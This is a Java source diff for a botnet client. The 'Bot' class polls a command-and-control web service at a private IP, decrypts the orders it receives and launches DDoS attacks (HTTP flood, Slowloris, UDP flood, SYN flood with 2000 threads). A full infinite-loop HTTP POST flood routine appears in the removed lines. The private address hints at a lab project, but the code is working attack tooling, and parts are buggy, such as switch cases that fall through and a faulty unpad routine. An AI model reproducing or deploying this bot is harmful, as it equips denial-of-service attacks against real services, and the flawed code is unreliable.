@@ -1,12 +1,10 @@
-import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
-import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
-import java.net.URL;
-import java.net.URLEncoder;
+import java.net.UnknownHostException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.LinkedList;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -31,36 +29,53 @@ import org.apache.commons.httpclient.MultiThreadedHttpConnectionManager;
 import org.apache.commons.httpclient.params.HttpConnectionManagerParams;
 
 public class Bot {
+
+	private static final String ERROR = "error";
+	private static final String REST = "rest";
+	private static final String CODIF = "ISO-8859-1";
+	private static final long T_MAX = 12000; 
+	private static final String HTTPFLOOD = "http";
+	private static final String SLOWLORIS = "slow";
+	private static final String UDPFLOOD = "udp";
+	private static final String TCPFLOOD = "tcp";
 	
-	
+	private static final int THREADS = 2000;
+
 	private static OMFactory omFactory = OMAbstractFactory.getOMFactory();
 	private static OMNamespace omNameSpace = omFactory.createOMNamespace("http://ws.apache.org/axis2", "nsTablon");
 	private static Options options = new Options();
 	private static String urlTablon = "http://192.168.0.13:7090/axis2/services/Tablon/";
 	
-	public static void main (String[] args){
+	
+	public static void main(String[] args) {
 		boolean actuar = false;
 		Comando comando = null;
-		while(!actuar){
-			try{
+		LinkedList<Comando> ejecutados = new LinkedList<Comando>();
+		
+		while (!actuar) {
+			ejecutados = actualizarEjecutados(ejecutados);
+			try {
 				Thread.sleep(1000);
-			} catch(InterruptedException e){
+			} catch (InterruptedException e) {
 				e.printStackTrace();
 			}
 			comando = getComando();
-			if(comando != null && !comando.getAtaque().equals("")){
-				actuar = true;
-				System.out.println(comando);
+			if (comando != null && (!comando.getAtaque().equals(REST) || comando.getAtaque().equals(""))) {
+				if(!ejecutados.contains(comando)){
+					System.out.println(comando);
+					atacar(comando);
+					ejecutados.add(comando);
+
+				}
 			}
 		}
-		System.out.println("---> " + comando.getAtaque());
-		atacar(comando);
-		
+
 	}
 	
 	public static Comando getComando(){
+		System.out.println("buscando ordenes");
+		
 		Comando comando = null;
-
 		ServiceClient cliente = null;
 		try {
 			cliente = new ServiceClient();
@@ -69,7 +84,7 @@ public class Bot {
 		}
 		
 		options.setTo(new EndpointReference(urlTablon));
-		options.setAction("urn:obey");
+		options.setAction("urn:getComando");
 		options.activate(getConf());
 
 		cliente.setOptions(options);
@@ -84,11 +99,9 @@ public class Bot {
 		}
 		
 		OMElement elem = respuesta.getFirstElement();
-		System.out.println(elem.getText());
 		try {
 			comando = new Comando(elem.getText());
 		} catch (NumberFormatException | MalformedURLException | ArrayIndexOutOfBoundsException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 			return new Comando("", null, 0);
 		}
@@ -97,45 +110,56 @@ public class Bot {
 	}
 	
 	
-	private static void atacar(Comando comando) {
+	private static boolean atacar(Comando comando){
 		switch(comando.getAtaque()){
-		case "httpFlood":
-			httpFlood(comando);
+		case HTTPFLOOD:
+			Ataque.httpFlood(comando);
 			break;
+		case SLOWLORIS:
+			try {
+				Ataque.slowlorisFlood(comando, THREADS);
+			} catch (UnknownHostException e) {
+				e.printStackTrace();
+				return false;
+			}
+		case UDPFLOOD:
+			try {
+				Ataque.UDPFlood(comando);
+			} catch (IOException e) {
+				e.printStackTrace();
+				return false;
+			}
+		case TCPFLOOD:
+			try {
+				Ataque.SYNFlood(comando, THREADS);
+			} catch (UnknownHostException e) {
+				e.printStackTrace();
+				return false;
+			}
 		default:
 			break;
 		}
-		return;
+		return true;
 	}
-	
-	private static void httpFlood(Comando comando) {
-		URL url = comando.getObjetivo();
-		HttpURLConnection connection = null;
-		boolean seguir = true;
-		while (true) {
-			System.out.println("ENVIAR PETICION HTTP");
-			try {
-				String urlParameters = "param1=" + URLEncoder.encode("???", "UTF-8") + "&param2="
-						+ URLEncoder.encode("???", "UTF-8");
-				connection = (HttpURLConnection) url.openConnection();
-				connection.setRequestMethod("POST");
-				connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-				connection.setRequestProperty("Content-Length", Integer.toString(urlParameters.getBytes().length));
-				connection.setRequestProperty("Content-Language", "en-US");
-				connection.setUseCaches(false);
-				connection.setDoOutput(true);
-				DataOutputStream out = new DataOutputStream(connection.getOutputStream());
-				out.writeBytes(urlParameters);
-				out.close();
 
-			} catch (IOException e) {
-				e.printStackTrace();
-			}
+	
+	
+	public static LinkedList<Comando> actualizarEjecutados(LinkedList<Comando> ejecutados){
+		long current = System.currentTimeMillis();
+		LinkedList<Comando> actualizada = new LinkedList<Comando>();
+		for(Comando c : ejecutados){
+			long dif = current - c.getDuracion();
+			if(dif < T_MAX){
+				actualizada.add(c);
+			}			
 		}
+		return actualizada;
+		
 	}
 	
 	
-	public static void desencriptar(String cText, int cLen){
+	
+	public static String desencriptar(String cText, int cLen){
 		Cipher cipher = null;
 		byte[] plainText = new byte[cLen];
 		SecretKeySpec sKey = null;
@@ -149,33 +173,64 @@ public class Bot {
 		byte[] encoded = cText.getBytes("ISO-8859-1");
 		int plen = cipher.update(encoded, 0, cLen, plainText, 0);
 		plen += cipher.doFinal(plainText, plen);
-		System.out.println(" obtenida --> " + new String(plainText));
 		
+		plainText = unPad(plainText);
+		
+		System.out.println(" obtenida --> " + new String(plainText));
+		return new String(plainText);
 		
 		} catch (UnsupportedEncodingException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return ERROR;
+			
 		} catch (NoSuchAlgorithmException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return ERROR;
+
 		} catch (NoSuchPaddingException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return ERROR;
+			
 		} catch (IllegalBlockSizeException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return ERROR;
+			
 		} catch (ShortBufferException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return ERROR;
+			
 		} catch (BadPaddingException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return ERROR;
+			
 		} catch (InvalidKeyException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return ERROR;
+			
 		}
 	}
 	
+	
+	
+	private static byte[] unPad(byte[] bytes){
+
+		int cont = 0;
+		for(int i = 0; i < bytes.length; i++){
+			if(bytes[i] == (byte) -0x80){
+				cont ++;
+			}
+		}
+		byte[] unpadded = new byte[bytes.length + cont];
+		
+		for(int i = 0; i < bytes.length; i++){
+			if(bytes[i] != (byte) -0x80){
+				unpadded[i] = bytes[i];
+			}
+		}
+		
+		return unpadded;
+		
+	}
 	
 	private static ConfigurationContext getConf() {
 
